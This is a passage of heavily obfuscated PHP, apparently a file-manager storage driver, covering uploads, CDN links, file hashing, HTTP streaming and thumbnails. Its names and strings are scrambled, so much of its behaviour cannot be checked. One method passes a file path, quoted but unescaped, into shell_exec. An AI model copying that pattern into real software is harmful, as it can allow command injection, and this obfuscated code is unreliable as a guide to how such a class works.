$f»Â²§ï‹Õ[$A‰î×Ë…£î] = $b‚×„Ã•¯; } return $b‚×„Ã•¯; } public function listPath($c‚àñÔŸ‡ß, $c¼ä¾Ñ–†† = false) { } public function has($Bˆßå¹°È, $d²·ƒë‰‚» = false, $fÍ¬½‡†¯© = false) { } public function canRead($EÍó¡‰ˆ¶) { } public function canWrite($c°©Ó‡ãš) { } public function getContent($C£¯ÑÀ«‚Œ) { } public function setContent($a‚«Ó‹ö´æ, $B²‘ğ©µ„‘ = '') { } protected function infoChildren($FçÏÜµ¿÷, &$BÚ¹Í´ßº¥) { $B‚É†›®ô¬ =& $_SERVER[¦·]; check_abort(); $CºÅôÅ™ = $this->listPath($FçÏÜµ¿÷, !0); $CºÅôÅ™ = array_merge($CºÅôÅ™[$B‚É†›®ô¬[74]], $CºÅôÅ™[$B‚É†›®ô¬[73]]); foreach ($CºÅôÅ™ as $C‡é¡àÊÅŠ) { if ($C‡é¡àÊÅŠ[$B‚É†›®ô¬[29]] == $B‚É†›®ô¬[76]) { $BÚ¹Í´ßº¥[$B‚É†›®ô¬[79]]++; $a³ìõ¨®Ô¯ = $this->getPathInner($C‡é¡àÊÅŠ[$B‚É†›®ô¬[75]]); $this->infoChildren($a³ìõ¨®Ô¯, $BÚ¹Í´ßº¥); } else { $BÚ¹Í´ßº¥[$B‚É†›®ô¬[78]]++; $BÚ¹Í´ßº¥[$B‚É†›®ô¬[77]] += $C‡é¡àÊÅŠ[$B‚É†›®ô¬[77]]; } } } public function fileSubstr($a™¨â˜˜, $aÇ…¶½ÌÅĞ, $eÜ„µËµÙ¾) { } public function listAll($cÁ³±ºÂë) { } public function upload($F®À¾‚ÙĞ, $EÖ Úçàé, $b’ÕõÜ¬ÑÑ = false, $A‡”ĞØ‚œ³ = REPEAT_REPLACE) { } public function uploadFileByID($D ÷÷ëøØ, $d”íÆİ’µ‡, $b¨šØµ¸) { } public function uploadFileByPath($Eğ®Ğ£¨Ë, $d¥Ò‚ßèçº, $f‰ÀºªÃ“õ = array()) { } public function isUploadServer() { $d‘ª¬š‡‚† =& $_SERVER[¦·]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d‘ª¬š‡‚†[83]) { return !0; } return $GLOBALS[$d‘ª¬š‡‚†[6]][$d‘ª¬š‡‚†[84]][$d‘ª¬š‡‚†[85]]; } public function isFileOutServer() { $dîÑ™ëà‘é =& $_SERVER[¦·]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dîÑ™ëà‘é[83]) { return !0; } return $GLOBALS[$dîÑ™ëà‘é[6]][$dîÑ™ëà‘é[84]][$dîÑ™ëà‘é[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aœòÉİÌ×) { $A‰Ó¯×· ± =& $_SERVER[¦·]; if (!$this->isCdnHost()) { return $aœòÉİÌ×; } return str_replace(trim(get_url_root($aœòÉİÌ×), $A‰Ó¯×· ±[8]), trim($this->cdnHost, $A‰Ó¯×· ±[8]), $aœòÉİÌ×); } public function uploadLink($Có””ëË“å, $aîƒïÏî‰š = 0) { goto DÁƒİ»´®µ; F¯Ø±İ³İ‹: if (!in_array($E®á¯½éí×, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $dà³ó×ß»ğ = 1024 * 1024 * 10; goto fá²ËØŠ•Ò; DÁƒİ»´®µ: $fİƒ®ßÀø’ =& $_SERVER[¦·]; if ($this->isUploadServer()) { return; } $E®á¯½éí× = $this->getType(); goto F¯Ø±İ³İ‹; fá²ËØŠ•Ò: $dÕÈô›éª = $aîƒïÏî‰š <= $dà³ó×ß»ğ ? $fİƒ®ßÀø’[87] : $fİƒ®ßÀø’[88]; $eŒ¯·ùø„ = (!$aîƒïÏî‰š ? 1 : ceil($aîƒïÏî‰š / pow(1024, 3))) * 3600 * 4; $E–Üâ½¦³Ä = $this->{$dÕÈô›éª}($Có””ëË“å, $eŒ¯·ùø„); goto bé”Í¨Ø¶; bé”Í¨Ø¶: if ($E–Üâ½¦³Ä) { $E–Üâ½¦³Ä[$fİƒ®ßÀø’[89]] = $Có””ëË“å; $E–Üâ½¦³Ä[$fİƒ®ßÀø’[90]] = $E®á¯½éí×; } return $E–Üâ½¦³Ä; goto c‚ÒâÊ“’œ; c‚ÒâÊ“’œ: } public function uploadFormData($e•Å½‘Ï–Û, $EÑÒÛ¹äõ° = 3600) { } public function multiUploadFormData($D½õêäì…‡, $EŒÙš´íİ = 3600) { } public function download($A·‰Æ¯İÁ, $F¹Â™ÍÏ‚) { } public function ext($C†²”ó÷ë„) { $e™©µÑÚªİ =& $_SERVER[¦·]; if (strpos($C†²”ó÷ë„, $e™©µÑÚªİ[8]) === -1) { $E¥Ü¬‰óµ = $C†²”ó÷ë„; } else { $E¥Ü¬‰óµ = $this->pathThis($C†²”ó÷ë„); } $cóŞÅªœŞ = $e™©µÑÚªİ[33]; if (strstr($E¥Ü¬‰óµ, $e™©µÑÚªİ[91])) { $cóŞÅªœŞ = substr($E¥Ü¬‰óµ, strrpos($E¥Ü¬‰óµ, $e™©µÑÚªİ[91]) + 1); $cóŞÅªœŞ = strtolower($cóŞÅªœŞ); } if (strlen($cóŞÅªœŞ) > 3 && preg_match($e™©µÑÚªİ[92], $cóŞÅªœŞ, $aÖšœ’Éñ)) { $cóŞÅªœŞ = $e™©µÑÚªİ[33]; } return $cóŞÅªœŞ; } public function pathThis($cêß·İ°®) { $aİÚèÀ¾Å =& $_SERVER[¦·]; $cêß·İ°® = str_replace($aİÚèÀ¾Å[93], $aİÚèÀ¾Å[8], rtrim($cêß·İ°®, $aİÚèÀ¾Å[8])); $D‹ŸÚÁ­ = strrpos($cêß·İ°®, $aİÚèÀ¾Å[8]); if ($D‹ŸÚÁ­ === !1) { return $cêß·İ°®; } return substr($cêß·İ°®, $D‹ŸÚÁ­ + 1); } public function pathFather($CÛ˜„Şß¶…) { $AèÏõÙ¿ =& $_SERVER[¦·]; $CÛ˜„Şß¶… = str_replace($AèÏõÙ¿[93], $AèÏõÙ¿[8], rtrim($CÛ˜„Şß¶…, $AèÏõÙ¿[8])); $DË³‚Ì¥·á = strrpos($CÛ˜„Şß¶…, $AèÏõÙ¿[8]); if ($DË³‚Ì¥·á === !1) { return $AèÏõÙ¿[33]; } return substr($CÛ˜„Şß¶…, 0, $DË³‚Ì¥·á + 1); } public function hashSimple($cÊˆ½ñœÀŸ) { goto BŸ™£¸à½»; BŸ™£¸à½»: $dÈÚŸ—Ã§† =& $_SERVER[¦·]; if (!$cÊˆ½ñœÀŸ) { return md5($dÈÚŸ—Ã§†[33]); } $B”©Å÷©Õƒ = $this->size($cÊˆ½ñœÀŸ); goto CÙğà¤Ùö‘; fÒåáòóĞÛ: $B¼‰ñ‘Ş” = intval($B”©Å÷©Õƒ / $c‰Ø¢ëâ); $F•÷³âÕËÈ = $dÈÚŸ—Ã§†[33]; for ($dó”Œ½ ¢ = 0; $dó”Œ½ ¢ < $c‰Ø¢ëâ; $dó”Œ½ ¢++) { $F•÷³âÕËÈ .= $this->fileSubstr($cÊˆ½ñœÀŸ, $B¼‰ñ‘Ş” * $dó”Œ½ ¢, $aÒÕ¸ÛÁøÇ); } goto dêƒÔÒÜ‡è; dêƒÔÒÜ‡è: $F•÷³âÕËÈ .= $this->fileSubstr($cÊˆ½ñœÀŸ, $B”©Å÷©Õƒ - $aÒÕ¸ÛÁøÇ, $aÒÕ¸ÛÁøÇ); return md5($F•÷³âÕËÈ) . $B”©Å÷©Õƒ; goto c¨¯ƒœ˜©Ä; CÙğà¤Ùö‘: $aÒÕ¸ÛÁøÇ = 200; $c‰Ø¢ëâ = 50; if ($B”©Å÷©Õƒ <= $aÒÕ¸ÛÁøÇ * $c‰Ø¢ëâ) { return $this->hashMd5($cÊˆ½ñœÀŸ) . $B”©Å÷©Õƒ; } goto fÒåáòóĞÛ; c¨¯ƒœ˜©Ä: } public static $md5Cache = array(); public function hashMd5($b¡š ©Éøƒ) { $b¡š ©Éøƒ = $this->iconvSystem($b¡š ©Éøƒ); if (isset(self::$md5Cache[$b¡š ©Éøƒ])) { return self::$md5Cache[$b¡š ©Éøƒ]; } self::$md5Cache[$b¡š ©Éøƒ] = $this->hashMd5Shell($b¡š ©Éøƒ); if (!self::$md5Cache[$b¡š ©Éøƒ]) { self::$md5Cache[$b¡š ©Éøƒ] = @md5_file($b¡š ©Éøƒ); } return self::$md5Cache[$b¡š ©Éøƒ]; } private function hashMd5Shell($fÅöÕŒ¶Ü) { goto cÏÇß¹òß‘; F ¹«ê¼Éğ: $fË”‡œßäÊ = shell_exec($a…•‡äÑ×È . "\40\x22{$fÅöÕŒ¶Ü}\x22"); $fË”‡œßäÊ = str_replace($C²“àáá[100], $C²“àáá[33], $fË”‡œßäÊ); return substr($fË”‡œßäÊ, 0, 32); goto bå‚á–‡ÎÜ; cÏÇß¹òß‘: $C²“àáá =& $_SERVER[¦·]; if (!function_exists($C²“àáá[94])) { return !1; } $E áŒÊåËÏ = array($C²“àáá[95], $C²“àáá[96]); goto fíê­À§‡; fíê­À§‡: $a…•‡äÑ×È = Cache::get($C²“àáá[97]); if (!$a…•‡äÑ×È) { $D©¶ÕÏ‰µã = BASIC_PATH . $C²“àáá[98]; $d¡ÆÌÃİ‚˜ = md5_file($D©¶ÕÏ‰µã); $a…•‡äÑ×È = $C²“àáá[99]; foreach ($E áŒÊåËÏ as $AñàÍµ·) { $fË”‡œßäÊ = shell_exec($AñàÍµ· . "\x20\42{$D©¶ÕÏ‰µã}\x22"); if ($fË”‡œßäÊ && substr(trim($fË”‡œßäÊ), 0, 32) == $d¡ÆÌÃİ‚˜) { $a…•‡äÑ×È = $AñàÍµ·; break; } } Cache::set($C²“àáá[97], $a…•‡äÑ×È, 3600); } if ($a…•‡äÑ×È == $C²“àáá[99]) { return !1; } goto F ¹«ê¼Éğ; bå‚á–‡ÎÜ: } public function link($c”«ªòªƒ¥) { return $c”«ªòªƒ¥; } public function fileOut($FÑßğÅ¾ç¼, $C„¡™œïÃ = false, $B×Äøºêô = false, $B³œµ¡éµ = '') { goto d°”¤µ”²ø; e¸Öå–£Ôœ: header($cÕ¥¯»å‚ã[125]); header($cÕ¥¯»å‚ã[126]); header($cÕ¥¯»å‚ã[127]); goto f­•“åòÁ†; CÅäœÎ„äŒ: $aëšÇ²İĞ® = 0; $e¹ôÕ…âê = $dÑ¶ØÁáà - 1; $BÚ‘õ ·ˆÉ = $this->ext($aÈöƒ†Å…); goto cõ¬Íˆ÷; bâ†”êºŠ: $D‚äÛ ‹”¨ = rawurlencode($aÈöƒ†Å…); $D‚äÛ ‹”¨ = $cÕ¥¯»å‚ã[113] . $D‚äÛ ‹”¨ . $cÕ¥¯»å‚ã[117] . $D‚äÛ ‹”¨; if ($C„¡™œïÃ) { header($cÕ¥¯»å‚ã[118]); header($cÕ¥¯»å‚ã[119] . $D‚äÛ ‹”¨); } else { header($cÕ¥¯»å‚ã[120] . $D‚äÛ ‹”¨); } goto DâÜÀ”Ç; cÃÏ¸¦È“ğ: header($cÕ¥¯»å‚ã[132] . $dŒåÎ‹ŠÜÓ . $cÕ¥¯»å‚ã[124]); header($cÕ¥¯»å‚ã[133] . $aÈöƒ†Å…); header($cÕ¥¯»å‚ã[134]); goto AĞñ‹œ¨“Å; a‰æ‡¯…Ì¢: @ob_end_clean(); set_timeout(); $E£øç‘³Ï = $this->infoFull($FÑßğÅ¾ç¼); goto B¬‡Ô°ÉÂ; AĞñ‹œ¨“Å: header($cÕ¥¯»å‚ã[135] . $dÑ¶ØÁáà); header($cÕ¥¯»å‚ã[136]); if (!$C„¡™œïÃ && $BÚ‘õ ·ˆÉ == $cÕ¥¯»å‚ã[137]) { if ($dÑ¶ØÁáà > 1024 * 1024 * 5) { die; } $AÙÙŠ‘…Ä = $this->getContent($FÑßğÅ¾ç¼); $AÙÙŠ‘…Ä = Html::clearSVG($AÙÙŠ‘…Ä); header($cÕ¥¯»å‚ã[138] . $dÑ¶ØÁáà); echo $AÙÙŠ‘…Ä; die; } goto FÂò£ÒˆĞ; cõ¬Íˆ÷: if (in_array($BÚ‘õ ·ˆÉ, array($cÕ¥¯»å‚ã[108], $cÕ¥¯»å‚ã[109], $cÕ¥¯»å‚ã[110], $cÕ¥¯»å‚ã[111]))) { $BÚ‘õ ·ˆÉ = $cÕ¥¯»å‚ã[112]; } if (!$B³œµ¡éµ) { $B³œµ¡éµ = md5($dŒåÎ‹ŠÜÓ . $this->hashSimple($FÑßğÅ¾ç¼)); } $B³œµ¡éµ = $cÕ¥¯»å‚ã[113] . $B³œµ¡éµ . $cÕ¥¯»å‚ã[113]; goto FƒêÔ¦£÷ˆ; bÈ¿§Ùè›“: if ($_SERVER[$cÕ¥¯»å‚ã[154]] == $cÕ¥¯»å‚ã[155]) { return; } $F•¼ˆ‹ŞÁ„ = 1024 * 100; $b†²ÌÃ¬ˆë = 0; goto e»«Ãåºƒ¥; EÀ›òË–øÍ: $cèùÜÃÌ¼ë = $this->getType() == $cÕ¥¯»å‚ã[102]; $eŞÍ®Ù‡õ = $GLOBALS[$cÕ¥¯»å‚ã[6]][$cÕ¥¯»å‚ã[84]][$cÕ¥¯»å‚ã[103]][$cÕ¥¯»å‚ã[104]]; $cêºÒÛ´áõ = (double) $GLOBALS[$cÕ¥¯»å‚ã[6]][$cÕ¥¯»å‚ã[84]][$cÕ¥¯»å‚ã[103]][$cÕ¥¯»å‚ã[105]] * 1024 * 1024; goto a‰æ‡¯…Ì¢; f­•“åòÁ†: if (isset($_SERVER[$cÕ¥¯»å‚ã[128]]) && strtotime($_SERVER[$cÕ¥¯»å‚ã[128]]) == $E£øç‘³Ï[$cÕ¥¯»å‚ã[107]]) { header($cÕ¥¯»å‚ã[129], !0, 304); die; } if (isset($_SERVER[$cÕ¥¯»å‚ã[130]]) && $_SERVER[$cÕ¥¯»å‚ã[130]] == $B³œµ¡éµ) { header($cÕ¥¯»å‚ã[131] . $B³œµ¡éµ, !0, 304); die; } header($cÕ¥¯»å‚ã[131] . $B³œµ¡éµ); goto cÃÏ¸¦È“ğ; FƒêÔ¦£÷ˆ: $DÉ¢óí£Ö• = get_file_mime($BÚ‘õ ·ˆÉ); if (strstr($DÉ¢óí£Ö•, $cÕ¥¯»å‚ã[114])) { $DÉ¢óí£Ö• = $DÉ¢óí£Ö• . $cÕ¥¯»å‚ã[115]; } if ($C„¡™œïÃ === !1 && !mime_support($DÉ¢óí£Ö•)) { $C„¡™œïÃ = !0; $DÉ¢óí£Ö• = $cÕ¥¯»å‚ã[116]; } goto bâ†”êºŠ; b§Åèâ®±Í: $CóöÄËè Ñ = !0; if ($_SERVER[$cÕ¥¯»å‚ã[151]] == $cÕ¥¯»å‚ã[152] && $dÑ¶ØÁáà > 1204 * 1024 * 1024 * 2) { $CóöÄËè Ñ = !1; } if ($CóöÄËè Ñ) { header($cÕ¥¯»å‚ã[153] . ($e¹ôÕ…âê - $aëšÇ²İĞ® + 1)); } goto bÈ¿§Ùè›“; FÂò£ÒˆĞ: $c–Á‘×£çÇ = strtolower($_SERVER[$cÕ¥¯»å‚ã[139]]); if ($cèùÜÃÌ¼ë && $c–Á‘×£çÇ && $eŞÍ®Ù‡õ) { if (strstr($c–Á‘×£çÇ, $cÕ¥¯»å‚ã[140])) { header($cÕ¥¯»å‚ã[141] . $FÑßğÅ¾ç¼); } else { if (strstr($c–Á‘×£çÇ, $cÕ¥¯»å‚ã[142])) { header($cÕ¥¯»å‚ã[143] . $FÑßğÅ¾ç¼); } else { if (strstr($c–Á‘×£çÇ, $cÕ¥¯»å‚ã[144])) { header($cÕ¥¯»å‚ã[145] . $FÑßğÅ¾ç¼); } } } if ($cêºÒÛ´áõ) { header($cÕ¥¯»å‚ã[146] . $cêºÒÛ´áõ); } return; } if (isset($_SERVER[$cÕ¥¯»å‚ã[147]])) { if (preg_match($cÕ¥¯»å‚ã[148], $_SERVER[$cÕ¥¯»å‚ã[147]], $bƒÖ—Ÿ³š)) { $aëšÇ²İĞ® = intval($bƒÖ—Ÿ³š[1]); if (!empty($bƒÖ—Ÿ³š[2])) { $e¹ôÕ…âê = intval($bƒÖ—Ÿ³š[2]); } } header($cÕ¥¯»å‚ã[149]); header("\x43\x6f\156\x74\145\x6e\x74\x2d\122\141\156\x67\145\x3a\x20\x62\x79\164\145\163\x20{$aëšÇ²İĞ®}\x2d{$e¹ôÕ…âê}\x2f" . $dÑ¶ØÁáà); } else { header($cÕ¥¯»å‚ã[150]); } goto b§Åèâ®±Í; e»«Ãåºƒ¥: if ($cêºÒÛ´áõ) { $b†²ÌÃ¬ˆë = intval(1000 * 1000 * ($F•¼ˆ‹ŞÁ„ / $cêºÒÛ´áõ)); } while ($aëšÇ²İĞ® <= $e¹ôÕ…âê) { $BÉíÛÚ×ğ— = timeFloat(); check_abort(); $C’ø„êóÏÙ = $e¹ôÕ…âê - $aëšÇ²İĞ® + 1; if ($C’ø„êóÏÙ <= $F•¼ˆ‹ŞÁ„) { $F•¼ˆ‹ŞÁ„ = $C’ø„êóÏÙ; } echo $this->fileSubstr($FÑßğÅ¾ç¼, $aëšÇ²İĞ®, $F•¼ˆ‹ŞÁ„); $aëšÇ²İĞ® += $F•¼ˆ‹ŞÁ„; if ($F•¼ˆ‹ŞÁ„ == $C’ø„êóÏÙ) { $aëšÇ²İĞ® = $e¹ôÕ…âê + 1; } if ($b†²ÌÃ¬ˆë) { $AôâÖ¶‡Öò = intval(1000 * 1000 * (timeFloat() - $BÉíÛÚ×ğ—)); $eí¥¼ „é = $b†²ÌÃ¬ˆë - $AôâÖ¶‡Öò; if ($eí¥¼ „é > 5) { usleep($eí¥¼ „é); } } } goto b‰‰§Ó‰‹è; B¬‡Ô°ÉÂ: $dÑ¶ØÁáà = $E£øç‘³Ï[$cÕ¥¯»å‚ã[77]]; $dŒåÎ‹ŠÜÓ = gmdate($cÕ¥¯»å‚ã[106], $E£øç‘³Ï[$cÕ¥¯»å‚ã[107]]); $aÈöƒ†Å… = $B×Äøºêô ? $B×Äøºêô : $this->iconvApp($E£øç‘³Ï[$cÕ¥¯»å‚ã[28]]); goto CÅäœÎ„äŒ; d°”¤µ”²ø: $cÕ¥¯»å‚ã =& $_SERVER[¦·]; $this->cacheMethod(null, null); if (!$FÑßğÅ¾ç¼ || !$this->exist($FÑßğÅ¾ç¼)) { show_json(LNG($cÕ¥¯»å‚ã[101]), !1, $B×Äøºêô); } goto EÀ›òË–øÍ; DâÜÀ”Ç: header($cÕ¥¯»å‚ã[121]); header($cÕ¥¯»å‚ã[122] . $DÉ¢óí£Ö•); header($cÕ¥¯»å‚ã[123] . gmdate($cÕ¥¯»å‚ã[106], time() + 3600 * 24 * 30) . $cÕ¥¯»å‚ã[124]); goto e¸Öå–£Ôœ; b‰‰§Ó‰‹è: } public function fileOutServer($eˆˆÀ—éÌ’, $B Û‹ŒÁ´– = false, $D¿ßí´˜¼º = false, $Eô²ŞºÏÁŠ = '') { $this->fileOut($eˆˆÀ—éÌ’, $B Û‹ŒÁ´–, $D¿ßí´˜¼º, $Eô²ŞºÏÁŠ); } public function fileOutLink($c©á›‘¶”±) { header($_SERVER[¦·][156] . $c©á›‘¶”±); die; } public function cacheMethod($D§Í¬÷·¾Ò, $F†å¿£Æƒ£) { goto a¯ ¡³Áîó; a¯ ¡³Áîó: $d›ÎÜµŒ¹“ =& $_SERVER[¦·]; static $AŞƒ½äŸè = array(); $B²¯›¸ìë¼ = $F†å¿£Æƒ£ ? ltrim($this->getPathOuter($F†å¿£Æƒ£), $d›ÎÜµŒ¹“[8]) : $F†å¿£Æƒ£; goto DÔÛ‰Ç˜Îİ; d‡”Àã‡: $cÌÈ»¦ÈŞ = isset($AŞƒ½äŸè[$bíğŠ§ˆßÅ]) ? $AŞƒ½äŸè[$bíğŠ§ˆßÅ] : null; if (!is_null($cÌÈ»¦ÈŞ)) { return $cÌÈ»¦ÈŞ; } $cÌÈ»¦ÈŞ = $this->{$D§Í¬÷·¾Ò}($F†å¿£Æƒ£); goto F¤–İ®‹‘†; DÔÛ‰Ç˜Îİ: $bíğŠ§ˆßÅ = $d›ÎÜµŒ¹“[157] . $D§Í¬÷·¾Ò . $d›ÎÜµŒ¹“[158] . rtrim($B²¯›¸ìë¼, $d›ÎÜµŒ¹“[8]); if (is_null($D§Í¬÷·¾Ò)) { $AŞƒ½äŸè = array(); return; } if (is_null($F†å¿£Æƒ£)) { unset($AŞƒ½äŸè[$bíğŠ§ˆßÅ]); return; } goto d‡”Àã‡; F¤–İ®‹‘†: $AŞƒ½äŸè[$bíğŠ§ˆßÅ] = $cÌÈ»¦ÈŞ; return $cÌÈ»¦ÈŞ; goto c–¡å¤ˆù; c–¡å¤ˆù: } public function fileOutImage($C£²½ãÂ, $D²®Æíë = 250) { goto Cß…—áĞ¥»; cÖÏ­ŒÔŠ: if (!($Cí‚×¸Êöß = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $c„‚°ğĞ²˜[165]))) { $a¤è¢ª© = IO::mkdir(IO_PATH_SYSTEM_TEMP . $c„‚°ğĞ²˜[166]); } else { $a¤è¢ª© = KodIO::make($Cí‚×¸Êöß); } if ($Cí‚×¸Êöß = IO::fileNameExist($a¤è¢ª©, $aâ‚àäĞÁÎ)) { $eÊ™²éîô = KodIO::make($Cí‚×¸Êöß); return IO::fileOut($eÊ™²éîô); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto c•à‘ÂÓì’; F‡æŠƒÒ‹ô: if (!($E½™àŒ½† = IO::move($eÊ™²éîô, $a¤è¢ª©))) { return IO::fileOut($eÊ™²éîô); } del_file($eÊ™²éîô); IO::fileOut($E½™àŒ½†); goto dŒÎÆİªßÀ; Cß…—áĞ¥»: $c„‚°ğĞ²˜ =& $_SERVER[¦·]; if (substr($C£²½ãÂ, 0, 4) == $c„‚°ğĞ²˜[144]) { $this->fileOutLink($C£²½ãÂ); } $AÇêĞÔ“ğÑ = $this->info($C£²½ãÂ); goto eµÚß‘„¿; eµÚß‘„¿: if ($AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[77]] <= 1024 * 50 || !function_exists($c„‚°ğĞ²˜[159]) || $AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[160]] == $c„‚°ğĞ²˜[161]) { return $this->fileOut($C£²½ãÂ); } if (isset($AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[162]][$c„‚°ğĞ²˜[163]])) { $A¸Æ—µ‚øó = $AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[162]][$c„‚°ğĞ²˜[163]]; } else { if (isset($AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[162]][$c„‚°ğĞ²˜[164]])) { $A¸Æ—µ‚øó = $AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[162]][$c„‚°ğĞ²˜[164]]; } else { $A¸Æ—µ‚øó = md5("{$AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[28]]}\137{$AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[75]]}\x5f{$AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[77]]}"); } } $aâ‚àäĞÁÎ = "{$A¸Æ—µ‚øó}\137{$D²®Æíë}\x2e\x70\156\147"; goto cÖÏ­ŒÔŠ; c•à‘ÂÓì’: $eÊ™²éîô = DATA_THUMB . $aâ‚àäĞÁÎ; if (!@file_exists($eÊ™²éîô)) { $F¯ìçñùé = TEMP_FILES; if (!is_dir($F¯ìçñùé)) { mk_dir($F¯ìçñùé); } $DÃõÎŒ‰ĞÙ = $F¯ìçñùé . $A¸Æ—µ‚øó . $c„‚°ğĞ²˜[91] . $AÇêĞÔ“ğÑ[$c„‚°ğĞ²˜[160]]; if (!@file_exists($DÃõÎŒ‰ĞÙ)) { $DÃõÎŒ‰ĞÙ = $this->download($C£²½ãÂ, $DÃõÎŒ‰ĞÙ); } $E’Ö†‡ñŒç = new ImageThumb($DÃõÎŒ‰ĞÙ, $c„‚°ğĞ²˜[167]); $E’Ö†‡ñŒç->prorate($eÊ™²éîô, $D²®Æíë, $D²®Æíë * 10); } if (!file_exists($eÊ™²éîô) || filesize($eÊ™²éîô) < 100) { return @file_exists($DÃõÎŒ‰ĞÙ) ? IO::fileOut($DÃõÎŒ‰ĞÙ) : $this->fileOut($C£²½ãÂ); } goto F‡æŠƒÒ‹ô; dŒÎÆİªßÀ: } public function fileOutImageServer($A¶«Ã‘Û‚», $bŒ÷åö¨ã = 250) { $this->fileOutImage($A¶«Ã‘Û‚», $bŒ÷åö¨ã); } public function fileNameAuto($fİ‰ÔàÀ, $c¿ƒÉ¸°ä«, $C–¼¦àëÌ† = REPEAT_RENAME, $DåìâÏËÂÁ = false) { goto c­ˆ¹„ÄĞÓ; c­ˆ¹„ÄĞÓ: $cª²Õá‹ö¹ =& $_SERVER[¦·]; $A·‘·¢†ÑÏ = $fİ‰ÔàÀ === $cª²Õá‹ö¹[33] ? $c¿ƒÉ¸°ä« : rtrim($fİ‰ÔàÀ, $cª²Õá‹ö¹[8]) . $cª²Õá‹ö¹[8] . $c¿ƒÉ¸°ä«; if ($C–¼¦àëÌ† == REPEAT_REPLACE || !$this->exist($A·‘·¢†ÑÏ) || $DåìâÏËÂÁ && $C–¼¦àëÌ† != REPEAT_RENAME_FOLDER) { return $c¿ƒÉ¸°ä«; } goto B’Ãà¤˜Üå; Aã¤†¨Œä: $A²ç‹èáÄØ = 1; $DŒ“õÒ¬Õï = substr($c¿ƒÉ¸°ä«, 0, strlen($c¿ƒÉ¸°ä«) - strlen($d÷øáÇŸÖ×)); $A’ âÈ¶±Á = $DŒ“õÒ¬Õï . "\x28{$A²ç‹èáÄØ}\51{$d÷øáÇŸÖ×}"; goto e–ëªñë×; B’Ãà¤˜Üå: if ($C–¼¦àëÌ† == REPEAT_SKIP) { return !1; } $d÷øáÇŸÖ× = $cª²Õá‹ö¹[91] . get_path_ext($c¿ƒÉ¸°ä«); $d÷øáÇŸÖ× = $d÷øáÇŸÖ× == $cª²Õá‹ö¹[91] || $DåìâÏËÂÁ ? $cª²Õá‹ö¹[33] : $d÷øáÇŸÖ×; goto Aã¤†¨Œä; e–ëªñë×: while ($this->exist(rtrim($fİ‰ÔàÀ, $cª²Õá‹ö¹[8]) . $cª²Õá‹ö¹[8] . $A’ âÈ¶±Á)) { $A’ âÈ¶±Á = $DŒ“õÒ¬Õï . "\50{$A²ç‹èáÄØ}\x29{$d÷øáÇŸÖ×}"; $A²ç‹èáÄØ++; } return $A’ âÈ¶±Á; goto aãë¿é‚; aãë¿é‚: } public function listAllFiles($fÌ«ªàì”, $CÒåÊĞº—ˆ, $EÛ†­á¤´’ = array()) { goto D”¦ÔÇ’•; CÀÂÖŠ: foreach (array_unique($Eß¾«âñİ) as $cÀäºùâŸ) { $B‘´ëÊÅï£ = array($DïÊ±éØìõ[75] => $this->getPathOuter($DïÊ±éØìõ[8] . $fÌ«ªàì” . $DïÊ±éØìõ[8] . $cÀäºùâŸ), $DïÊ±éØìõ[76] => 1, $DïÊ±éØìõ[77] => 0); if (substr($cÀäºùâŸ, -1) != $DïÊ±éØìõ[8]) { $B‘´ëÊÅï£[$DïÊ±éØìõ[76]] = 0; $b”Ã ’Ïœ‰ = $this->getPath($fÌ«ªàì” . $DïÊ±éØìõ[8] . $cÀäºùâŸ); $B‘´ëÊÅï£[$DïÊ±éØìõ[77]] = isset($EÛ†­á¤´’[$b”Ã ’Ïœ‰]) ? $EÛ†­á¤´’[$b”Ã ’Ïœ‰] : $this->size($b”Ã ’Ïœ‰); } $bõ²°îƒÔ[] = $B‘´ëÊÅï£; } return $bõ²°îƒÔ; goto Cõé›œÒä®; D”¦ÔÇ’•: $DïÊ±éØìõ =& $_SERVER[¦·]; if (empty($CÒåÊĞº—ˆ)) { return array(); } $Eß¾«âñİ = array(); goto FÍ—ù¦Ñèƒ; FÍ—ù¦Ñèƒ: $fÌ«ªàì” = trim($fÌ«ªàì”, $DïÊ±éØìõ[8]); foreach ($CÒåÊĞº—ˆ as $cÀäºùâŸ) { $DæŸ°çŒÌö = ltrim(substr($cÀäºùâŸ, strlen($fÌ«ªàì”)), $DïÊ±éØìõ[8]); $Eß¾«âñİ = array_merge($Eß¾«âñİ, $this->slicePath($DæŸ°çŒÌö)); } $bõ²°îƒÔ = array(); goto CÀÂÖŠ; Cõé›œÒä®: } public function slicePath($eÀæŞª‹¬›) { $eè„ãÚ‡²Ì =& $_SERVER[¦·]; $Få±Û„‘ğ = explode($eè„ãÚ‡²Ì[8], trim($eÀæŞª‹¬›, $eè„ãÚ‡²Ì[8])); $E»¤ò•íäË = 0; do { ++$E»¤ò•íäË; $C¾î¹àÌˆ[] = implode($eè„ãÚ‡²Ì[8], array_slice($Få±Û„‘ğ, 0, $E»¤ò•íäË)) . $eè„ãÚ‡²Ì[8]; } while ($E»¤ò•íäË < count($Få±Û„‘ğ)); $C¾î¹àÌˆ[count($Få±Û„‘ğ) - 1] = $eÀæŞª‹¬›; return $C¾î¹àÌˆ; } public function getHost() { $f°Ûá¨Ïİ =& $_SERVER[¦·]; $eµ»ã¨ª‡ = parse_url(trim($this->domain, $f°Ûá¨Ïİ[8])); $bÑ¨ñ¢óš = isset($eµ»ã¨ª‡[$f°Ûá¨Ïİ[168]]) ? $eµ»ã¨ª‡[$f°Ûá¨Ïİ[168]] : http_type(); $Eƒ‹·ö”óÍ = isset($eµ»ã¨ª‡[$f°Ûá¨Ïİ[169]]) ? $eµ»ã¨ª‡[$f°Ûá¨Ïİ[169]] : $eµ»ã¨ª‡[$f°Ûá¨Ïİ[75]]; if (isset($eµ»ã¨ª‡[$f°Ûá¨Ïİ[170]])) { $Eƒ‹·ö”óÍ .= 